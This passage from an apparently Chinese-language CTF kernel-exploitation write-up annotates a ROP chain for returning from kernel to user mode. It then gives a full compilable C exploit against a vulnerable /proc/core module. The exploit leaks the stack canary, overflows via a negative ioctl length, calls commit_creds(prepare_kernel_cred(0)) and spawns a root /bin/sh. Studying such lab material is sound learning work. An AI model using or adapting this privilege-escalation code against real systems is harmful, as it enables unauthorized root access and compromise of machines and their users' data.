rop[i++] = (size_t)get_root;                // 到用户态执行            rop[11]
rop[i++] = base + 0xa012da;                 // swapgs; popfq; ret     rop[12]
/*
在 Linux 中内核态和用户态使用的 GS 寄存器是不同的。
既然我们马上要回用户态了，就必须执行 swapgs 把 GS 寄存器切换回用户态的状态，
否则回去之后系统会瞬间崩溃。
后面的 0 是为了应付 popfq（弹给标志寄存器）的对齐填充。执行完后 ret，弹出 rop[13]
*/
rop[i++] = 0;                               //                        rop[13]
rop[i++] = base + 0x50ac2;                  // iretq; ret			  rop[14]
/*
跳转到内核的 iretq 指令
iretq 是 x86_64 架构下从内核态（Ring 0）彻底返回用户态（Ring 3）的指令。
它会从栈上依次弹出 5 个高规格参数来恢复用户态的硬件现场。
因此它会调用后面所有的参数
*/
rop[i++] = (size_t)shell;   // 1. 弹出到 RIP：降落到用户态后，第一行要执行的代码（弹Shell）
rop[i++] = user_cs;         // 2. 弹出到 CS：恢复用户态代码段权限（Ring 3）
rop[i++] = user_rflags;     // 3. 弹出到 RFLAGS：恢复用户态的标志寄存器
rop[i++] = user_sp;         // 4. 弹出到 RSP：切换到我们提前准备好的干净的用户态新栈
rop[i++] = user_ss;         // 5. 弹出到 SS：恢复用户态堆栈段
```

#### 提权 root
```c
write(fd, rop, 0x200);
ioctl(fd, 0x6677889A, 0xffffffffffff0000 | 0x100);
```

1. `write`：把上面构造的 `rop` 链拷贝到内核全局变量 `name` 暂存。
2. `ioctl`：触发 `core_copy_func`，同时递过去致命毒药参数 `0xFFFFFFFFFFFF0100`，负数通过检查，低 16 位截断成 256 字节

### EXP
```c
// gcc exp2.c -static -masm=intel -O2 -o exp2
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

size_t commit_creds;
size_t prepare_kernel_cred;
size_t user_cs, user_ss, user_rflags;
char shell_stack[0x4000] __attribute__((aligned(16)));

static inline __attribute__((always_inline)) void save_status()
{
    asm volatile(
        "mov %0, cs;"
        "mov %1, ss;"
        "pushf;"
        "pop %2;"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
    );
}

void get_root()
{
    void *(*pkc)(void *) = (void *)prepare_kernel_cred;
    int (*cc)(void *) = (void *)commit_creds;

    cc(pkc(NULL));
}

void shell()
{
    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
}

size_t get_base()
{
    FILE *fp;
    size_t base;

    fp = popen("grep startup_64 /tmp/kallsyms | awk '{print $1}'", "r");
    fscanf(fp, "%lx", &base);
    pclose(fp);
    return base;
}

int main()
{
    int fd, i;
    char leak[0x40] = {0};
    size_t rop[0x40] = {0};
    size_t base, canary, user_sp;

    save_status();

    base = get_base();
    commit_creds = base + 0x9c8e0;
    prepare_kernel_cred = base + 0x9cce0;

    fd = open("/proc/core", O_RDWR);
    ioctl(fd, 0x6677889C, 0x40);
    ioctl(fd, 0x6677889B, leak);
    canary = ((size_t *)leak)[0];

    user_sp = (size_t)shell_stack + sizeof(shell_stack) - 0x100;
    user_sp = (user_sp & 0xfffffffffffffff0) + 8;

    for (i = 0; i < 10; i++) {
        rop[i] = canary;
    }

    rop[i++] = (size_t)get_root;
    rop[i++] = base + 0xa012da; // swapgs; popfq; ret
    rop[i++] = 0;
    rop[i++] = base + 0x50ac2;  // iretq; ret
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(fd, rop, 0x200);
    ioctl(fd, 0x6677889A, 0xffffffffffff0000 | 0x100);
    return 0;
}

